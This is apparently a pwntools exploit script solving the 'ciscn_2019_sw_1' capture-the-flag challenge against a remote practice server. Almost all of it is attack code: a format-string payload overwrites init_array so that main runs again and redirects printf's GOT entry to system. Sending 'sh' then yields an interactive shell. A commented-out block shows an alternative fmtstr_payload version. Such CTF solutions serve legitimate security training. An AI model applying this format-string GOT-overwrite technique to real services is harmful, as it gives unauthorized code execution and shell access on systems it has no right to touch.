# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './ciscn_2019_sw_1'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25067'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

#这题保护几乎全关，哪里都可以写，同样也可以写init_array使程序循环执行,但只能一次性写入

'''init_array_1 = 0x804979c
mian = 0x08048534
printf_got = elf.got["printf"]
system_plt = elf.plt["system"]
#4

lg("printf_got",printf_got)

payload = fmtstr_payload( 4 , {init_array_1 : mian} )
sla("name?",payload)

payload1 = fmtstr_payload( 4 , {printf_got : system_plt} )
sla("name?",payload1)'''

payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)

sla("name?",payload)

sla("name?","sh")

p.interactive()

'''
@File    :   ciscn_2019_sw_1.py
@Time    :   2021/07/20 20:14:36
@Author  :   Niyah 
'''